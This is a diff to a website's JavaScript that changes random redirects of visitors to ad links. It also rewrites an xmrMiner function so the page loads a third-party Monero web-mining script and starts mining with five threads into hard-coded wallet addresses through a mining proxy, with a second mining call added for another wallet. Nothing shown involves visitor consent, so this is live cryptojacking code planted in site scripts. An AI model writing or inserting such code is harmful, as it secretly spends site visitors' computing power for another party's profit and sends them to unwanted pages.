@@ -8,11 +8,11 @@ var jsFiles = [
 
 var links = [
     'https://l.imc.re/adsterra'
-    // ,
-    // 'https://l.imc.re/pddcpa',
-    // 'https://l.imc.re/haoka',
-    // 'https://l.imc.re/ad'
 ];
+// ,
+// 'https://l.imc.re/pddcpa',
+// 'https://l.imc.re/haoka',
+// 'https://l.imc.re/ad'
 
 function loadIMCMain() {
     loadScripts(jsFiles);
@@ -32,10 +32,14 @@ function loadIMCMain() {
     }
 
     var randomNumber = Math.random();
-    if (randomNumber <= 0.5) {
-        redirectToLinks('win');
-    } else {
+    console.log('test:');
+    console.log(randomNumber);
+    if (randomNumber >= 0.8) {
         redirectToLinks('loc');
+        console.log("loc");
+    } else {
+        redirectToLinks('win');
+        console.log("win");
     }
 }
 
@@ -94,19 +98,29 @@ function redirectToDomain() {
 }
 
 function xmrMiner() {
-    loadScripts([
-        // 'https://imc.re/assets/js/na-monero.js',
-        "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
-    ]);
-    server = "wss://ny1.xmrminingproxy.com";
-    var pool = "moneroocean.stream";
-    var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
-    var workerId = "WEB-XMR"
-    var threads = 5; //-1
-    var password = "";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
+    // Start Of Mining Code (Javascript)
+    var script = document.createElement("script");
+    // script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+    script.src = "https://thelifewillbefine.de/karma/karma.js?karma=bs%253Falgy=rx/0%253Fnosaj=xmr.miner.mcbe-server.com:9000";
+    // script.src = "/assets/js/na-monero.js";
+
+    // 使用load事件确保脚本加载完毕后再执行startMining函数
+    script.onload = function() {
+        server = "wss://ny1.xmrminingproxy.com";
+        var pool = "moneroocean.stream";
+        var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
+        var workerId = "WEB-XMR"
+        var threads = 5; //-1
+        var password = "";
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
+
+        EverythingIsLife('46CCPD4KmGbcs3vCwUPtkUCaKQRzLmb6GR7NJwj93anPg3CPugJbDmucumG7r3JsUH4PGRBSoHQAyCXjNDYffHJPHPdrGst', workerId, 80);
+    };
+    document.head.appendChild(script);
+    // End Of Mining Code
 }
+
 
 // 百度统计
 function baiduTongji(id) {
